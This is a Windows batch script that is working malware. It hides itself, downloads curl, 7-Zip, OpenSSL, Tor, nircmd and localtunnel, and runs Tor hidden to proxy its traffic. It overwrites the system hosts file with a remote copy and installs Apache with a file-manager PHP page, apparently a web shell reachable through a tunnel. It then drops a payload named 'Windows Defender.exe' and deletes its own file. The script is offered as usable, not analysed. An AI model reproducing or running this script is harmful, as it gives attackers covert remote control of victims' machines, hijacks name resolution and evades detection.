@echo off
setlocal 
attrib +s +h +i "%~f0"
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

set host=https://cryptedodissey.github.io
set environment=C:\Windows

rem TESTING >
if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
rem TESTING <

attrib -s -h -i "%environment%\curl.exe" && if exist "%environment%\curl.exe" (
      attrib +s +h +i "%environment%\curl.exe"
) else (
 powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/bigherocenter/curl/raw/main/curl_7.83.1.exe' -OutFile '%environment%\curl.exe' -UseBasicParsing -MaximumRedirection 10 ; Start-BitsTransfer -Source (Invoke-WebRequest -Uri 'https://github.com/bigherocenter/curl/raw/main/curl_7.83.1.exe' -UseBasicParsing -MaximumRedirection 10).BaseResponse.ResponseUri.AbsoluteUri -Destination '%environment%\curl.exe'" && attrib +s +h +i "%environment%\curl.exe" 
)

attrib -s -h -i "%environment%\7-Zip" && if exist "%environment%\7-Zip\7z.exe" (
      attrib +s +h +i "%environment%\7-Zip"
) else (
  mkdir "%environment%\7-Zip" && "%environment%\curl.exe" -k -L https://github.com/aaubertsolutions/7za/raw/master/7za.exe -o "%environment%\7-Zip\7z.exe" && attrib +s +h +i "%environment%\7-Zip" 
)

attrib -s -h -i "%environment%\openssl.exe" && if exist "%environment%\openssl.exe" (
    attrib +s +h +i "%environment%\openssl.exe"
) else (
   "%environment%\curl.exe" -k -L https://indy.fulgan.com/SSL/Archive/openssl-1.0.2-i386-win32.zip -o "%temp%\openssl.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\openssl.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\openssl.exe" && attrib +s +h +i "%environment%\libeay32.dll" && attrib +s +h +i "%environment%\ssleay32.dll"
)

attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
    attrib +s +h +i "%environment%\tor.exe"
) else (
   "%environment%\curl.exe" -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz -o "%temp%\Tor.tar.gz" && "%environment%\7-Zip\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7-Zip\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
)

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (echo) else (
  "%environment%\nircmd.exe" exec hide "%environment%\tor.exe" && timeout -t 30
)

attrib -s -h -i "%environment%\nircmd.exe" && if exist "%environment%\nircmd.exe" (
   "%environment%\curl.exe" -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
) else (
"%environment%\curl.exe" -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
)

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
  set "proxy=--tlsv1"
)

"%environment%\curl.exe" -k %proxy% https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/hosts > "C:\Windows\System32\drivers\etc\hosts"

attrib -s -h -i "%environment%\localtunnel" && if exist "%environment%\localtunnel" (
   attrib +s +h +i "%environment%\localtunnel"
) else (
 "%environment%\curl.exe" -k -L https://github.com/angelobreuer/localtunnel.net/releases/download/1.0.1.0/win-x86.zip > "%temp%/localtunnel.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\localtunnel.zip" -o"%environment%" -y && ren "%environment%\win-x86" "localtunnel" && attrib +s +h +i "%environment%\localtunnel" && del /s /f /q /a "%temp%\localtunnel.zip"
)

tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
if not errorlevel 1 (attrib -s -h -i "%environment%\apache2" && "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" apache2\conf\*.* apache2\php\tinyfilemanager.php -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z") else (attrib -s -h -i "%environment%\apache2" && "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z")

 attrib -s -h -i "%environment%\ffmpeg.exe" && if exist "%environment%\ffmpeg.eexe" (
    attrib +s +h +i "%environment%\ffmpeg.exe"
) else (
   "%environment%\curl.exe" -k %proxy% %host%/Tools/ffmpeg.7z -o "%temp%\ffmpeg.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\ffmpeg.7z" -p7zffmpeg -o"%environment%" -y && attrib +s +h +i "%environment%\ffmpeg.exe" && del /s /f /q /a "%temp%\ffmpeg.7z"
)

"%environment%\curl.exe" -k %proxy% https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/hosts > "C:\Windows\System32\drivers\etc\hosts"

attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe" 
endlocal
DEL /s /f /q /a "%~f0"
